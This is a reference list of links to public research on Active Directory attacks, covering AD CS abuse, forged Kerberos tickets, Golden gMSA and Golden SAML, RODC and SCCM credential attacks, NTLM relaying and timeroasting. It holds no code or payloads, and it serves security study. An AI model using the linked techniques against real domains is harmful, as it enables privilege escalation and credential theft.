* [ADCS: Playing with ESC4 - Matthew Creel](https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4)
* [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
* [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
* [AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh](https://www.blackarrow.net/ad-cs-from-manageca-to-rce/)
* [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
* [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
* [bloodyAD and CVE-2022-26923 - soka - 11 May 2022](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
* [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)
* [How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html)
* [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
* [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
* [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
* [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
* [A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
* [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
* [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
* [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
* [.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive](https://znlive.com/xmlserializer-deserialization-vulnerability)
* [Practical guide for Golden SAML - Practical guide step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)
* [Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
* [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)
* [Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022](https://aadinternals.com/post/gmsa/)
* [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
* [Poc’ing Beyond Domain Admin - Part 1 - cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/)
* [At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06)
* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf](https://adsecurity.org/?p=3592)
* [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
* [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)
* [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
* [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
* [ADIDNS Revisited – WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)
* [Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema](https://blog.fox-it.com/2019/04/25/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/)
* [S4U2self abuse - TheHackerRecipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
* [Abusing Kerberos S4U2self for local privilege escalation - cfalta](https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/)
* [External Trusts Are Evil - 14 March 2023 - Charlie Clark (@exploitph)](https://exploit.ph/external-trusts-are-evil.html)
* [Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)
